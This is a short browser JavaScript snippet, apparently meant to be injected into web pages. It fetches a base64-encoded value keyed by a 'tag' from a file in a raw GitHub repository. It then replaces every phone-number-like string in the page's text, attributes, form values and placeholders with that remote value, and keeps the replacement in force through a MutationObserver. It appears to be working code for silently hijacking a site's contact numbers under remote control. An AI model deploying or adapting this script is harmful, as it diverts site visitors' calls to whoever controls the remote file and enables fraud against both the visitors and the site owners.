(async () => {
  const TXT_URL = "https://raw.githubusercontent.com/h02y/not/refs/heads/main/not";
  const KEY = "edit_phone_number";
  const PHONE = /(?:\+|00)?[\d\s().-]{7,}/g;
  const digits = s => (s.match(/\d/g) || []).length;
  const okPhone = s => digits(s) >= 7 && (/[()\s.-]/.test(s) || /^\s*(\+|00)/.test(s));
  const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

  const src = (document.currentScript && document.currentScript.src) || "";
  const tag = new URL(src, location.href).searchParams.get("tag");
  if (!tag) return console.warn("[beam] no tag");

  const txt = await (await fetch(TXT_URL, { cache: "no-store" })).text();
  const m = txt.match(new RegExp("^\\s*\\[" + esc(tag) + "\\]\\s+([^\\s]+)\\s*$", "m"));
  if (!m) return console.warn("[beam] tag not found:", tag);

  const value = (() => {
    try {
      const bin = atob(m[1].trim());
      try {
        return decodeURIComponent(Array.from(bin, c => "%" + c.charCodeAt(0).toString(16).padStart(2, "0")).join(""));
      } catch {
        return bin;
      }
    } catch {
      return "";
    }
  })();
  if (!value) return console.warn("[beam] bad base64");

  const repl = s => s && s.split(KEY).join(value).replace(PHONE, x => okPhone(x) ? value : x);

  const scan = root => {
    const w = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_TEXT);
    for (let n; (n = w.nextNode());) {
      if (n.nodeType === 3) {
        const v = n.nodeValue, nv = repl(v);
        if (nv !== v) n.nodeValue = nv;
      } else {
        for (const a of Array.from(n.attributes || [])) {
          const v = a.value, nv = repl(v);
          if (nv !== v) n.setAttribute(a.name, nv);
        }
        if (typeof n.value === "string") { const nv = repl(n.value); if (nv !== n.value) n.value = nv; }
        if (typeof n.placeholder === "string") { const nv = repl(n.placeholder); if (nv !== n.placeholder) n.placeholder = nv; }
      }
    }
  };

  scan(document.documentElement);

  const mo = new MutationObserver(ms => {
    for (const t of ms) {
      if (t.type === "characterData") scan(t.target.parentNode || document.documentElement);
      else if (t.type === "attributes") scan(t.target);
      else for (const n of t.addedNodes) scan(n.nodeType === 1 ? n : (n.parentNode || document.documentElement));
    }
  });

  mo.observe(document.documentElement, { subtree: true, childList: true, characterData: true, attributes: true });
  window.__stopBeam = () => mo.disconnect();
})();
